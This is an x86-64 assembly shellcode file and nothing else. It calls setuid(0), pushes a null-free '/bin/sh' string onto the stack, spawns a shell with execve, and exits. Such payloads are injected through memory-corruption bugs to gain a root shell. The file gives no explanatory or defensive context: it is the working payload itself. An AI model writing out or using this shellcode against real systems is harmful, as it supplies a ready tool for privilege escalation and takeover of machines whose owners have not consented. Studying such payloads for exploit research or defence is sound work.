section .text
    global _start

_start:
    xor     rdi, rdi         ; setuid(0)
    mov     al, 0x69
    syscall

    xor     rdx, rdx         ; NULL
    mov     rbx, 0x68732f6e69622fff ; "/bin/sh" (with junk)
    shr     rbx, 8           ; clean junk: "/bin/sh"
    push    rbx
    mov     rdi, rsp         ; rdi = "/bin/sh"
    xor     rax, rax
    push    rax              ; null terminator
    push    rdi              ; argv[0]
    mov     rsi, rsp         ; rsi = &argv
    mov     al, 59           ; syscall number for execve
    syscall

    push    1                ; for exit(1)
    pop     rdi
    push    60               ; syscall number for exit
    pop     rax
    syscall

